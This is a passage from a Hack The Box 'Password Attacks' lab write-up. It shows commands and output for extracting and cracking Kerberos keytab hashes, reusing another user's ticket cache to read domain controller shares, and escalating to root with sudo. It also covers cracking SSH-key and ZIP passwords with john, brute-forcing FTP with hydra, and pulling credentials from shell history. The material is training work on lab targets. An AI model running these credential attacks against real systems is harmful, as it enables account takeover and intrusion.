  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

**Answer:** `Linux Admins`

### Question:
![](./attachments/Pasted%20image%2020230209121324.png)
*Hint: Check which privileges you have on that file.*

```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4 16:26 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Feb  9 11:13 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4 14:31 /opt/impacket/impacket/krb5/keytab.py
   262618      4 -rw-rw-rw-   1 root     root          216 Feb  9 11:20 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6 12:03 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4 14:34 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

**Answer:** `carlos.keytab`

### Question:
![](./attachments/Pasted%20image%2020230209121351.png)
*Hint: There's a tool that help you extract the info you need.*

```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Cracking the NTLM hash at [crackstation.net](https://crackstation.net/).

![](./attachments/Pasted%20image%2020230209144506.png)

```
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
Password: 
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
C@rl0s_1$_H3r3
```



**Answer:** `C@rl0s_1$_H3r3`

### Question:
![](./attachments/Pasted%20image%2020230209121401.png)
*Hint: Check jobs and try the new keytabs you found. Are there any other keytab?*

```
carlos@inlanefreight.htb@linux01:~$ crontab -l
(...)
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

We found a new keytab file `svc_workstations.kt`.

Let's see if we can get the hash.

```
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
```

Multiple methods of cracking the hash failed. 

Trying to use `svc_workstations.kt` to impersonate the `svc_workstations` user in stead.

```
carlos@inlanefreight.htb@linux01:~$ kinit svc_workstations -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
carlos@inlanefreight.htb@linux01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_647402606_q0pvjk
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
02/09/2023 13:54:48  02/09/2023 23:54:48  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 02/10/2023 13:54:48

carlos@inlanefreight.htb@linux01:~$ smbclient //DC01/svc_workstations -k -c ls
  .                                   D        0  Wed Oct  5 15:39:28 2022
  ..                                  D        0  Wed Oct  5 15:39:28 2022
  flag.txt                            A       46  Wed Oct  5 15:39:28 2022

carlos@inlanefreight.htb@linux01:~$ smbclient //DC01/svc_workstations -k -c "get flag.txt"
getting file \flag.txt of size 46 as flag.txt (44.9 KiloBytes/sec) (average 44.9 KiloBytes/sec)
carlos@inlanefreight.htb@linux01:~$ cat flag.txt
��Keytab_Scr1pt$-F1l3s
```

Flag is malformed.

Back on track; looking in the same folder we found the `svc_workstations.kt` file we also find `svc_workstations._all.kt`. Running `keytabextract.py` on it reveals a NTLM hash which is easily cracked by [crackstation.net](https://crackstation.net/).

```
carlos@inlanefreight.htb@linux01:~$ ls /home/carlos@inlanefreight.htb/.scripts/
john.keytab  kerberos_script_test.sh  svc_workstations._all.kt  svc_workstations.kt
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
```

![](./attachments/Pasted%20image%2020230209191250.png)

Logging in with SSH.

```
┌──(kali㉿kali)-[~]
└─$ ssh svc_workstations@inlanefreight.htb@10.129.170.150 -p 2222

(...)

Last login: Wed Oct 12 21:18:12 2022 from 172.16.1.5
svc_workstations@inlanefreight.htb@linux01:~$ ls
flag.txt
svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
Mor3_4cce$$_m0r3_Pr1v$
```

**Answer:** `Mor3_4cce$$_m0r3_Pr1v$`

### Question:
![](./attachments/Pasted%20image%2020230209121429.png)
*Hint: Common way to privesc using sudo.*


```
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL

svc_workstations@inlanefreight.htb@linux01:~$ sudo su -
root@linux01:~# cat /root/flag.txt
Ro0t_Pwn_K3yT4b
```

**Answer:** `Ro0t_Pwn_K3yT4b`

### Question:
![](./attachments/Pasted%20image%2020230209121438.png)
*Hint: Remember not all ccache are valid.*

```
root@linux01:~# ls -lah /tmp/
total 76K
drwxrwxrwt 13 root                               root                           4.0K Feb  9 18:20 .
drwxr-xr-x 20 root                               root                           4.0K Oct  6  2021 ..
drwxrwxrwt  2 root                               root                           4.0K Feb  9 18:02 .font-unix
drwxrwxrwt  2 root                               root                           4.0K Feb  9 18:02 .ICE-unix
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Feb  9 18:20 krb5cc_647401106_cCbcaM
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Feb  9 18:20 krb5cc_647401106_HRJDux
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1.4K Feb  9 18:06 krb5cc_647401107_d1LC7L
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1.5K Feb  9 18:14 krb5cc_647401109_gMfMHf
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1.8K Feb  9 18:20 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1.4K Feb  9 18:07 krb5cc_647402606_91JyEJ
drwx------  3 root                               root                           4.0K Feb  9 18:02 snap.lxd
drwx------  3 root                               root                           4.0K Feb  9 18:02 systemd-private-405fa8b5eab44252b9f252bf8a8ac785-ModemManager.service-lqAHFf
drwx------  3 root                               root                           4.0K Feb  9 18:02 systemd-private-405fa8b5eab44252b9f252bf8a8ac785-systemd-logind.service-9V32Vf
drwx------  3 root                               root                           4.0K Feb  9 18:02 systemd-private-405fa8b5eab44252b9f252bf8a8ac785-systemd-resolved.service-Cpu2Di
drwx------  3 root                               root                           4.0K Feb  9 18:02 systemd-private-405fa8b5eab44252b9f252bf8a8ac785-systemd-timesyncd.service-sPcd2g
drwxrwxrwt  2 root                               root                           4.0K Feb  9 18:02 .Test-unix
drwx------  2 root                               root                           4.0K Feb  9 18:02 vmware-root_695-4021718990
drwxrwxrwt  2 root                               root                           4.0K Feb  9 18:02 .X11-unix
drwxrwxrwt  2 root                               root                           4.0K Feb  9 18:02 .XIM-unix
root@linux01:~# cp /tmp/krb5cc_647401106_cCbcaM .
root@linux01:~# ls /root
flag.txt  krb5cc_647401106_cCbcaM  snap
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_cCbcaM 
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_cCbcaM
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
02/09/2023 18:20:01  02/10/2023 04:20:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 02/10/2023 18:20:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Feb  9 18:02:29 2023
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Mon Oct 10 10:48:55 2022

                7706623 blocks of size 4096. 4459691 blocks available
root@linux01:~# smbclient //dc01/julio -k -c ls -no-pass
  .                                   D        0  Thu Jul 14 12:25:24 2022
  ..                                  D        0  Thu Jul 14 12:25:24 2022
  julio.txt                           A       17  Thu Jul 14 21:18:12 2022

                7706623 blocks of size 4096. 4459691 blocks available
root@linux01:~# smbclient //dc01/julio -k -c "get julio.txt" -no-pass
getting file \julio.txt of size 17 as julio.txt (16.6 KiloBytes/sec) (average 16.6 KiloBytes/sec)
root@linux01:~# ls
flag.txt  julio.txt  krb5cc_647401106_cCbcaM  snap
root@linux01:~# cat julio.txt 
JuL1()_SH@re_fl@g
```

**Answer:** `JuL1()_SH@re_fl@g`

### Question:
![](./attachments/Pasted%20image%2020230209121450.png)
*Hint: There is a file containing the credentials of Linux machines in Active Directory.*

```
root@linux01:/home# find / -name *keytab* -ls 2>/dev/null
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4 16:26 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   541571     12 -rw-r--r--   1 julio@inlanefreight.htb domain users@inlanefreight.htb     9028 Oct  5 13:19 /home/julio@inlanefreight.htb/.local/lib/python3.8/site-packages/impacket/krb5/__pycache__/keytab.cpython-38.pyc
   541562     12 -rw-r--r--   1 julio@inlanefreight.htb domain users@inlanefreight.htb    10015 Oct  5 13:18 /home/julio@inlanefreight.htb/.local/lib/python3.8/site-packages/impacket/krb5/keytab.py
   418707     12 -rw-r--r--   1 john@inlanefreight.htb  domain users@inlanefreight.htb     9028 Oct  4 16:33 /home/john@inlanefreight.htb/.local/lib/python3.8/site-packages/impacket/krb5/__pycache__/keytab.cpython-38.pyc
   418698     12 -rw-r--r--   1 john@inlanefreight.htb  domain users@inlanefreight.htb    10015 Oct  4 16:33 /home/john@inlanefreight.htb/.local/lib/python3.8/site-packages/impacket/krb5/keytab.py
   288491      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      146 Oct  6 14:20 /home/carlos@inlanefreight.htb/.scripts/john.keytab
   131610      4 -rw-------   1 root                     root                               2694 Feb  9 18:03 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root                     root                              10015 Oct  4 14:31 /opt/impacket/impacket/krb5/keytab.py
   262163      4 -rw-rw-rw-   1 root                     root                                216 Feb  9 18:35 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root                     root                               4582 Oct  6 12:03 /opt/keytabextract.py
   287958      4 drwx------   2 sssd                     sssd                               4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root                     root                                380 Oct  4 14:34 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
root@linux01:/home# cat /etc/krb5.keytab
@INLANEFREIGHT.HTLINUX01$c<^�Z����k�Љ+�S��@INLANEFREIGHT.HTLINUX01$c<^�$Smt,�Μ���W��PINLANEFREIGHT.HTLINUX01$c<^� �\n�:f���uT�@*q�����k��E�>�S��EINLANEFREIGHT.HTBhostLINUX01c<^�Z����k�Љ+�S��EINLANEFREIGHT.HTBhostLINUX01c<^�$Smt,�Μ���W��UINLANEFREIGHT.HTBhostLINUX01c<^� �\n�:f���uT�@*q�����k��E�>�S��WINLANEFREIGHT.HTBhostlinux01.inlanefreight.htbc<^�Z����k�Љ+�S��WINLANEFREIGHT.HTBhostlinux01.inlanefreight.htbc<^�$Smt,�Μ���W��gINLANEFREIGHT.HTBhostlinux01.inlanefreight.htbc<^� �\n�:f���uT�@*q�����k��E�>�S��RINLANEFREIGHT.HTBRestrictedKrbHostLINUX01c<^�Z����k�Љ+�S��RINLANEFREIGHT.HTBRestrictedKrbHostLINUX01c<^�$Smt,�Μ���W��bINLANEFREIGHT.HTBRestrictedKrbHostLINUX01c<^� �\n�:f���uT�@*q�����k��E�>�S��dINLANEFREIGHT.HTBRestrictedKrbHostlinux01.inlanefreight.htbc<^�Z����k�Љ+�S��dINLANEFREIGHT.HTBRestrictedKrbHostlinux01.inlanefreight.htbc<^�$Smt,�Μ���W��tINLANEFREIGHT.HTBRestrictedKrbHostlinux01.inlane�~ ▒tINLANEFREIGHT.HTBRestrictedKrbHostlinux01.inlanefreight.htbc�5� ���Ѳ��j�o�ˢ|���3�V�Ϲ����root@linux01:/home# ux01.inlanefreight.htbc�5�
root@linux01:/home# python3 /opt/keytabextract.py /etc/krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : LINUX01$/
        NTLM HASH : 5aa7d65408b1c36bb2d0892b8e53bce8
        AES-256 HASH : e95c6ed83a660fb802919f7554fa402a71f5e0f2b4e36bfbf545c33ee353f0ea
        AES-128 HASH : 24536d742cface9c06fbd8f257bd1de2

root@linux01:/home# kinit LINUX01$ -k -t /etc/krb5.keytab
root@linux01:/home# klist
Ticket cache: FILE:/root/krb5cc_647401106_cCbcaM
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
02/09/2023 18:42:50  02/10/2023 04:42:50  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 02/10/2023 18:42:50
root@linux01:/home# smbclient //DC01/LINUX01 -k -c ls
  .                                   D        0  Wed Oct  5 14:17:02 2022
  ..                                  D        0  Wed Oct  5 14:17:02 2022
  flag.txt                            A       52  Wed Oct  5 14:17:02 2022

                7706623 blocks of size 4096. 4459210 blocks available
root@linux01:/home# smbclient //DC01/LINUX01 -k -c "get flag.txt"
getting file \flag.txt of size 52 as flag.txt (25.4 KiloBytes/sec) (average 25.4 KiloBytes/sec)
root@linux01:/home# cat flag.txt
��Us1nG_KeyTab_Like_@_PRO
```

**Answer:** `Us1nG_KeyTab_Like_@_PRO`

---
## Protected Files
### Question:
![](./attachments/Pasted%20image%2020230209121821.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ locate *2john* |grep ssh
/usr/bin/ssh2john
/usr/share/john/ssh2john.py
/usr/share/john/__pycache__/ssh2john.cpython-310.pyc

┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ sudo /usr/share/john/ssh2john.py id_rsa > ssh.hash

┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ cat ssh.hash
id_rsa:$sshng$1$16$F1C2E21F3CF7BDF460FB56C7D16911F2$1776(...)

┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ john --wordlist=PasswordMutations/mut_password.list ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
L0veme           (id_rsa)     
1g 0:00:00:00 DONE (2023-02-09 14:03) 50.00g/s 2460Kp/s 2460Kc/s 2460KC/s l0vely94!..l0veme04!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Answer:** `L0veme`

---
## Protected Archives
### Question:
![](./attachments/Pasted%20image%2020230208122723.png)

Once again create an SMB server on the attack host to upload the notes.zip file to the attack host. Then extract the hash from the file with `zip2john`

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ zip2john Notes.zip > hash.txt
ver 1.0 efh 5455 efh 7875 Notes.zip/notes.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=D0CED23B ts=7EF8 cs=7ef8 type=0
       
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ cat hash.txt                            
Notes.zip/notes.txt:$pkzip$1*2*2*0*26*1a*d0ced23b*0*43*0*26*7ef8*b154046595e5f738ad20bd1cda08958a8814bd6c6153218183c0496d728da36461c0c7b77e1c*$/pkzip$:notes.txt:Notes.zip::Notes.zip
```

Use the mutated password list to crack the password.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux]
└─$ john --format=PKZIP --wordlist=mut_password.list SMBshare/hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd3!       (Notes.zip/notes.txt)     
1g 0:00:00:00 DONE (2023-02-08 06:24) 50.00g/s 3686Kp/s 3686Kc/s 3686KC/s P00hbear2022..R0ckst@r93
Use the "--show" option to display all of the cracked passwords reliably
```

Unzip the archive.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ unzip Notes.zip                                
Archive:  Notes.zip
[Notes.zip] notes.txt password: 
extracting: notes.txt

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/CredentialHuntinginLinux/SMBshare]
└─$ cat notes.txt
HTB{ocnc7r4io8ucsj8eujcm}
```

**Answer:** `HTB{ocnc7r4io8ucsj8eujcm}`

---
## Password Attacks Lab - Easy
### Question:
![](./attachments/Pasted%20image%2020230209205005.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ sudo nmap -n -sV -sC -oA nmap_sV_sC_top1000_scan 10.129.202.219
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 14:42 EST
Nmap scan report for 10.129.202.219
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f4c8f10f1aebecd31247ca14eab846d (RSA)
|   256 7b30376750b9ad91c08ff702783b7c02 (ECDSA)
|_  256 889e0e07fecad05c60abcf1099cd6ca7 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ hydra -l mike -P PasswordMutations/password.list ftp://10.129.158.232 -t 64 -V 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-10 06:17:28
[DATA] max 64 tasks per 1 server, overall 64 tasks, 203 login tries (l:1/p:203), ~4 tries per task
[DATA] attacking ftp://10.129.158.232:21/
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "123456" - 1 of 203 [child 0] (0/0)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "12345" - 2 of 203 [child 1] (0/0)
(...)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "tequiero" - 155 of 206 [child 43] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "7777777" - 156 of 206 [child 48] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "cheese" - 157 of 206 [child 51] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "159753" - 158 of 206 [child 5] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "arsenal" - 159 of 206 [child 16] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "dolphin" - 160 of 206 [child 20] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "antonio" - 161 of 206 [child 37] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "heather" - 162 of 206 [child 42] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "david" - 163 of 206 [child 44] (0/3)
[ATTEMPT] target 10.129.158.232 - login "mike" - pass "ginger" - 164 of 206 [child 17] (0/3)
[21][ftp] host: 10.129.158.232   login: mike   password: 7777777
```

user:pass `mike:7777777`

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ ftp 10.129.158.232        
Connected to 10.129.158.232.
220 (vsFTPd 3.0.3)
Name (10.129.158.232:kali): mike
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35275|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          554 Feb 09  2022 authorized_keys
-rw-------    1 1000     1000         2546 Feb 09  2022 id_rsa
-rw-r--r--    1 1000     1000          570 Feb 09  2022 id_rsa.pub
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||56754|)
150 Opening BINARY mode data connection for id_rsa (2546 bytes).
100% |****************************************************************************************************|  2546        2.55 MiB/s    00:00 ETA
226 Transfer complete.
2546 bytes received in 00:00 (70.56 KiB/s)
```

NOTE: Make sure there are not any files in the working directory with the same name. It will refuse to download.

Now login with `SSH`.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ ll                                                             
total 68
-rw-r--r-- 1 kali kali  2546 Feb  9  2022 id_rsa
   
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ chmod 600 id_rsa
 
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ ssh mike@10.129.158.232 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

(...)

Last login: Wed Feb  9 17:37:10 2022 from 10.129.202.64
mike@skills-easy:~$ ls -lah
total 40K
drwxr-xr-x 4 mike mike 4.0K Feb 10  2022 .
drwxr-xr-x 3 root root 4.0K Feb  9  2022 ..
-rw------- 1 mike mike 5.8K Feb 10  2022 .bash_history
-rw-r--r-- 1 mike mike  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mike mike 3.7K Feb 25  2020 .bashrc
drwx------ 2 mike mike 4.0K Feb  9  2022 .cache
-rw-r--r-- 1 mike mike  807 Feb 25  2020 .profile
drwx------ 2 mike mike 4.0K Feb  9  2022 .ssh
-rw------- 1 mike mike 2.8K Feb  9  2022 .viminfo
mike@skills-easy:~$ cat .bash_history 
vim updater.bash
bash updater.bash 
vim updater.bash
apt-cache search gem
sudo gem install -V lolcat
sudo apt-get install fortune
analysis.py -u root -p dgb6fzm0ynk@AME9pqu
```

**Answer:** `dgb6fzm0ynk@AME9pqu`

---
## Password Attacks Lab - Medium
### Question:
![](./attachments/Pasted%20image%2020230210185251.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations]
└─$ sudo nmap -n -sV -sC 10.129.202.221
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 12:54 EST
Nmap scan report for 10.129.202.221
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f4c8f10f1aebecd31247ca14eab846d (RSA)
|   256 7b30376750b9ad91c08ff702783b7c02 (ECDSA)
|_  256 889e0e07fecad05c60abcf1099cd6ca7 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-02-10T17:54:22
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.88 seconds
```

The SMB share is unprotected.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations]
└─$ rpcclient -U "" 10.129.202.221      
Password for [WORKGROUP\]:
rpcclient $> ls
command not found: ls
rpcclient $> netshareenumall
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: SHAREDRIVE
        remark: SHARE-DRIVE
        path:   C:\media\sharedrive
        password:
netname: IPC$
        remark: IPC Service (skills-medium server (Samba, Ubuntu))
        path:   C:\tmp
        password:
rpcclient $> exit

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations]
└─$ smbclient \\\\10.129.202.221\\SHAREDRIVE
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 10 05:39:38 2022
  ..                                  D        0  Thu Feb 10 05:35:54 2022
  Docs.zip                            N     6724  Thu Feb 10 05:39:38 2022

                14384136 blocks of size 1024. 10222672 blocks available
smb: \> get Docs.zip
```

Now we need to extract the password hash from the zip file.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ zip2john Docs.zip > hash.txt
ver 2.0 efh 5455 efh 7875 Docs.zip/Documentation.docx PKZIP Encr: TS_chk, cmplen=6522, decmplen=9216, crc=B1855553 ts=597A cs=597a type=8
```

And crack it.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ john --format=PKZIP --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Destiny2022!     (Docs.zip/Documentation.docx)     
1g 0:00:00:00 DONE (2023-02-10 13:01) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s cristina!..F00tb@ll81
